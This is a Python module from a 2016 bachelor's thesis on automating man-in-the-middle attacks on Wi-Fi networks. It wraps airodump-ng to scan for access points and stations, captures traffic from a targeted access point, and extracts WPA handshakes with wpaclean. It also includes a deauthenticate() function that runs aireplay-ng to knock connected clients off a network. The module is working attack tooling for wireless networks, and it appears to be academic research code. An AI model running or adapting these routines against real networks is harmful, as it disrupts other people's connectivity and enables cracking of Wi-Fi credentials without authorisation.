#!/usr/bin/env python3
"""
Common functionality used in various parts.

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""
import csv
import logging
import os
import subprocess
import tempfile
import time
from enum import Enum, unique
from typing import List

from .model import WirelessAccessPoint, WirelessStation, WirelessInterface

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


def csv_row_station_bssid(row):
    """
    Provide associated bssid of given station.
    :param row: list of strings representing one row of csv file generated by airodump-ng during scanning
    :return: string bssid
    """
    return row[5].strip()


def csv_row_to_station(row) -> WirelessStation:
    """
    Convert csv row to station.
    :param row: list of strings representing one row of csv file generated by airodump-ng during scanning

    :rtype: WirelessStation
    :return: WirelessStation object
    """
    mac_address = row[0].strip()
    power = row[3].strip()
    return WirelessStation(mac_address, power)


def csv_row_to_ap(row) -> WirelessAccessPoint:
    """
    Convert csv row to AP.
    :param row: list of strings representing one row of csv file generated by airodump-ng during scanning

    :rtype: WirelessAccessPoint
    :return: WirelessAccessPoint object
    """
    bssid = row[0].strip()
    power = row[8].strip()
    channel = row[3].strip()
    encryption = row[5].strip()
    cipher = row[6].strip()
    authentication = row[7].strip()
    wps = row[6].strip()
    #
    essid = row[13].strip()
    iv_sum = row[10].strip()

    ap = WirelessAccessPoint(bssid, power, channel, encryption, cipher, authentication, wps, essid, iv_sum)
    ap.update_known()

    return ap


def csv_to_result(csv_path) -> List[WirelessAccessPoint]:
    """
    Convert csv output file, generated by airodump-ng during scanning, to scan result.
    :param csv_path: path to csv output file

    :rtype: List[WirelessAccessPoint]
    :return: List containing WirelessAccessPoint objects with associated WirelessClient objects.
    """
    scan_result = list()
    with open(csv_path, newline='') as csv_file:
        reader = csv.reader(csv_file, delimiter=',')
        for row in reader:
            if len(row) < 2 or row[1] == ' First time seen':  # skip section headers and empty lines
                continue
            elif len(row) == 15:  # reading access points section
                ap = csv_row_to_ap(row)
                scan_result.append(ap)
            elif len(row) == 7:  # reading stations section
                station = csv_row_to_station(row)
                associated_bssid = csv_row_station_bssid(row)
                # add station to associated access point, stations section is read after access points section
                for ap in scan_result:
                    if ap.bssid == associated_bssid:
                        ap.add_associated_station(station)
    return scan_result


class WirelessScanner(object):
    def __init__(self, tmp_dir, interface: WirelessInterface):
        """
        :type interface: WirelessInterface
        :param interface: wireless interface for scanning
        """
        self.tmp_dir = tmp_dir
        self.interface = interface  # type: WirelessInterface

        self.process = None
        self.scanning_dir = None
        self.scanning_csv_path = None

    def start(self, write_interval=5):
        self.scanning_dir = tempfile.TemporaryDirectory(prefix='WirelessScanner-', dir=self.tmp_dir)
        cmd = ['airodump-ng',
               '-w', os.path.join(self.scanning_dir.name, 'scan'),
               '--output-format', 'csv',
               '--write-interval', str(write_interval),
               '-a',
               self.interface.name]
        self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.scanning_csv_path = os.path.join(self.scanning_dir.name, 'scan-01.csv')
        logger.debug('scan started')

    def stop(self):
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logger.debug('scan killed')

            self.process = None
            self.scanning_dir.cleanup()
            self.scanning_dir = None
            self.scanning_csv_path = None
            return exitcode

    def scan_once(self):
        """
        Scans once for wireless APs and clients.
        Scanning is done by airodump-ng for 6 seconds. After scanning, airodump-ng is terminated.
        :return: List containing WirelessAccessPoint objects with associated WirelessStation objects.
        """
        self.start(write_interval=2)
        time.sleep(6)
        result = csv_to_result(self.scanning_csv_path)
        self.stop()
        return result

    def get_scan_result(self):
        while not self.has_csv():
            logger.debug('WirelessScanner polling result')
            time.sleep(1)
        return csv_to_result(self.scanning_csv_path)

    def has_csv(self):
        return os.path.isfile(self.scanning_csv_path)


class WirelessCapturer(object):
    @unique
    class State(Enum):
        """
        WirelessCapturer process states.
        """
        ok = 0  # capturing
        new = 1  # just started
        terminated = 100

    def __init__(self, tmp_dir, interface: WirelessInterface):
        self.interface = interface  # type: WirelessInterface

        self.process = None
        self.state = None
        self.flags = {}
        self.tmp_dir = tmp_dir

        # process' stdout, stderr for its writing
        self.process_stdout_w = None
        self.process_stderr_w = None
        # process' stdout, stderr for reading
        self.process_stdout_r = None
        self.process_stderr_r = None

        self.capturing_dir = None
        self.capturing_csv_path = None
        self.capturing_cap_path = None
        self.capturing_xor_path = None

        self.wpa_handshake_cap_path = None

    def __init_flags(self):
        """
        Init flags describing state of the running process.
        Should be called only during start of the process. Flags are set during update_state().
        """
        self.flags['detected_wpa_handshake'] = False
        """Flag 'detected_wpa_handshake' is set if process detected WPA handshake, which is now saved in cap file."""

    def start(self, ap):
        self.state = self.__class__.State.new
        self.__init_flags()
        self.capturing_dir = tempfile.TemporaryDirectory(prefix='WirelessCapturer-', dir=self.tmp_dir)

        # temp files (write, read) for stdout and stderr
        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='WirelessCapturer-stdout',
                                                            dir=self.capturing_dir.name)
        self.process_stdout_r = open(self.process_stdout_w.name, 'r')

        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='WirelessCapturer-stderr',
                                                            dir=self.capturing_dir.name)
        self.process_stderr_r = open(self.process_stderr_w.name, 'r')

        cmd = ['airodump-ng',
               '--bssid', ap.bssid,
               '--channel', ap.channel,
               '-w', 'capture',
               '--output-format', 'csv,pcap',
               '--write-interval', '5',
               '--update', '5',  # delay between display updates
               '-a',
               self.interface.name]
        self.process = subprocess.Popen(cmd, cwd=self.capturing_dir.name,
                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
                                        universal_newlines=True)
        self.capturing_csv_path = os.path.join(self.capturing_dir.name, 'capture-01.csv')
        self.capturing_cap_path = os.path.join(self.capturing_dir.name, 'capture-01.cap')
        self.capturing_xor_path = os.path.join(self.capturing_dir.name,
                                               'capture-01-' + ap.bssid.replace(':', '-') + '.xor')
        logger.debug('WirelessCapturer started; cwd=' + self.capturing_dir.name + ', ' +
                      'stdout @ ' + self.process_stdout_w.name +
                      ', stderr @ ' + self.process_stderr_w.name)

    def update_state(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive. Set appropriate flags.
        """
        # check every added line in stdout
        if self.process_stdout_r and not self.process_stdout_r.closed:
            for line in self.process_stdout_r:  # type: str
                # NOTE: stdout should be empty
                logger.warning("Unexpected stdout of airodump-ng: '{}'. {}".format(line, str(self)))

        # check every added line in stderr
        for line in self.process_stderr_r:
            if 'WPA handshake:' in line and not self.flags['detected_wpa_handshake']:
                # only on the first print of 'WPA handshake:'
                self.flags['detected_wpa_handshake'] = True
                logger.debug('WirelessCapturer detected WPA handshake.')
                self.__extract_wpa_handshake()

        # is process running?
        if self.process.poll() is not None:
            self.state = self.__class__.State.terminated

    def stop(self):
        """
        Stop running process.
        If the process is stopped or already finished, exitcode is returned.
        In the case that there was not any process, nothing happens.
        :return:
        """
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logger.debug('WirelessCapturer stopped')

            self.process = None
            self.state = self.__class__.State.terminated
            return exitcode

    def clean(self):
        """
        Clean after running process.
        Running process is stopped, temp files are closed and deleted,
        :return:
        """
        logger.debug('WirelessCapturer clean')
        # if the process is running, stop it and then clean
        if self.process:
            self.stop()
        # close opened files
        self.process_stdout_r.close()
        self.process_stdout_r = None

        self.process_stdout_w.close()
        self.process_stdout_w = None

        self.process_stderr_r.close()
        self.process_stderr_r = None

        self.process_stderr_w.close()
        self.process_stderr_w = None

        # remove tmp
        self.capturing_dir.cleanup()
        self.capturing_dir = None
        self.capturing_csv_path = None
        self.capturing_cap_path = None
        self.capturing_xor_path = None

        # remove state
        self.state = None
        self.flags.clear()

    def get_capture_result(self):
        while not self.has_capture_csv():
            logger.debug('WirelessCapturer polling result')
            time.sleep(1)
        return csv_to_result(self.capturing_csv_path)

    def has_capture_csv(self):
        return os.path.isfile(self.capturing_csv_path)

    def has_prga_xor(self):
        return os.path.isfile(self.capturing_xor_path)

    def get_iv_sum(self) -> str:
        """
        Get sum of collected IVs.
        :rtype: str
        """
        aps = self.get_capture_result()
        if len(aps):
            return aps[0].iv_sum
        else:
            return 0

    def __extract_wpa_handshake(self):
        """
        Raises:
            CalledProcessError: If returncode of wpaclean is non-zero.
        """
        if not os.path.isfile(self.capturing_cap_path):
            raise FileNotFoundError
        hs_path = os.path.join(self.capturing_dir.name, 'WPA_handshake.cap')
        cmd = ['wpaclean', hs_path, self.capturing_cap_path]
        process = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process.check_returncode()
        self.wpa_handshake_cap_path = hs_path


def deauthenticate(interface: WirelessInterface, station, count=10):
    """
    "This  attack  sends  deauthentication  packets  to  one  or more clients which are currently associated with
    a particular  access point. Deauthenticating clients can be done for a number of reasons: Recovering a hidden ESSID.
    This is an ESSID which  is  not being broadcast. Another term for this is "cloaked" or Capturing WPA/WPA2 handshakes
    by forcing clients to reauthenticate or Generate  ARP  requests  (Windows clients sometimes flush their ARP cache
    when disconnected).  Of course,  this  attack  is  totally useless  if  there  are no associated wireless client
    or on fake authentications."
    `deauthentication[Aircrack-ng]<http://www.aircrack-ng.org/doku.php?id=deauthentication>`_

    :type interface: WirelessInterface
    :param interface: wireless interface for deauthentication

    :param station: associated station to be deauthenticated
    :param count: amount of deauth series to be sent, each series consists of 64 deauth packets

    The deauthentication packets are sent directly from your PC to the clients. So you must be physically close enough
    to the clients for your wireless card transmissions to reach them.
    """
    if count <= 0:
        raise ValueError

    cmd = ['aireplay-ng',
           '--deauth', str(count),
           '-a', station.associated_ap.bssid,  # MAC address of access point.
           '-c', station.mac_address,
           interface.name]

    process = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    logger.debug('deauth sent to ' + station.mac_address)
